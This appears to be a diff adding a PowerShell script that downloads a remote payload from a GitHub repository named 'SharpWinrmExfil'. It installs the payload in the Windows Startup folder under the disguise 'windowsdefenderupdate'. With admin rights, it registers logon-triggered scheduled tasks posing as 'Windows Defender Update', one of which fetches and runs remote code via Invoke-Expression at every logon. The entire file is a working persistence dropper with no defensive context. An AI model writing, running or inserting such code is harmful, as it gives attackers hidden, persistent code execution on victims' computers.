@@ -1,0 +1,48 @@
+function Test-IsAdmin {
+    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal($currentUser)
+    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+}
+
+$scriptUrl = "https://raw.githubusercontent.com/gokupwn/SharpWinrmExfil/main/test2"
+$scriptName = "windowsdefenderupdate.ps1"
+$userStartupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
+$scriptPath = [System.IO.Path]::Combine($userStartupFolder, $scriptName)
+
+if (-not (Test-Path -Path $userStartupFolder)) {
+    New-Item -ItemType Directory -Path $userStartupFolder -Force
+}
+
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($scriptUrl, $scriptPath)
+
+$shortcutPath = [System.IO.Path]::Combine($userStartupFolder, "windowsdefenderupdate.lnk")
+$wshShell = New-Object -ComObject WScript.Shell
+$shortcut = $wshShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-File `"$scriptPath`""
+$shortcut.WorkingDirectory = $userStartupFolder
+$shortcut.Save()
+
+if (Test-IsAdmin) {
+    $taskName = "Windows Defender Update"
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$scriptPath`""
+    $trigger = New-ScheduledTaskTrigger -AtLogon
+    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
+
+    Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName $taskName -Description "Run Windows Defender Update"
+
+    $downloadAndRunScript = @"
+\$webClient = New-Object System.Net.WebClient
+\$scriptUrl = '$scriptUrl'
+\$scriptContent = \$webClient.DownloadString(\$scriptUrl)
+Invoke-Expression \$scriptContent
+"@
+
+    $downloadAndRunTaskName = "DownloadAndRunWindowsDefenderUpdate"
+    $downloadAndRunAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"$downloadAndRunScript`""
+    $downloadAndRunTrigger = New-ScheduledTaskTrigger -AtLogon
+    $downloadAndRunPrincipal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
+
+    Register-ScheduledTask -Action $downloadAndRunAction -Trigger $downloadAndRunTrigger -Principal $downloadAndRunPrincipal -TaskName $downloadAndRunTaskName -Description "Download and Run Windows Defender Update"
+}
